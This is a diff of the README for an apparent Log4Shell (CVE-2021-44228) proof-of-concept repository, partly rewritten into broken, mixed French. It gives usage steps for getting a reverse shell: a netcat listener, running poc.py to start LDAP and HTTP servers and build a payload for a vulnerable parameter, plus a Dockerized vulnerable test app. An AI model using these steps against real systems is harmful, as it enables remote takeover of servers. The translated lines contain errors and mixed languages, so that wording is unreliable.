@@ -1,6 +1,6 @@
 # log4j-shell-poc
-A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
-Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
+A Proof-Of-Concept pour la récente vulnérabilité trouvée CVE-2021-44228 vulnerability. <br><br>
+Log4j, a java logging library largement utilisée en elasticsearch, minecraft et autres.
 
 
 
@@ -27,22 +27,22 @@ https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-
 Proof-of-concept (POC)
 ----------------------
 
-As a PoC we have created a python file that automates the process. 
+Pour une  PoC, le fichier poc.py est pour. 
 
 
-#### Requirements:
+#### Prérequis:
 ```bash
 pip install -r requirements.txt
 ```
 #### Usage:
 
 
-* Start a netcat listener to accept reverse shell connection.<br>
+* Lancer un netcat listener pour accepter la connexion reverse shell <br>
 ```py
 nc -lvnp 9001
 ```
 * Launch the exploit.<br>
-**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
+**Note:** Extraire java archive dans le même dossier sous le nom: `jdk1.8.0_20`.
 ```py
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 
@@ -57,12 +57,12 @@ $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 Listening on 0.0.0.0:1389
 ```
 
-This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
+Ce script va configurer un HTTP server et LDAP server pour vous, et il va créer un payload que vous pouvez  coller sur le paramètre vulnerable . Afprès cela, si tout marche bien, vous allez avoir un shell sur lport.
 
 <br>
 
 
-Our vulnerable application
+Notre vulnerable application
 --------------------------
 
 We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
@@ -70,24 +70,19 @@ We have added a Dockerfile with the vulnerable webapp. You can use this by follo
 1: docker build -t log4j-shell-poc .
 2: docker run --network host log4j-shell-poc
 ```
-Once it is running, you can access it on localhost:8080
+Une fois lancer, vous pouvez accéder par: localhost:8080
 
-If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.
 
-<br>
-
-Getting the Java version.
+Java version.
 --------------------------------------
 
-At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.
+Java 8: `java-8u20`.
 
 [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
 
 
-**Note:** You do need to make an account to be able to download the package.
-
 Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
-**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.
+
 
 ```
 ❯ tar -xf jdk-8u20-linux-x64.tar.gz
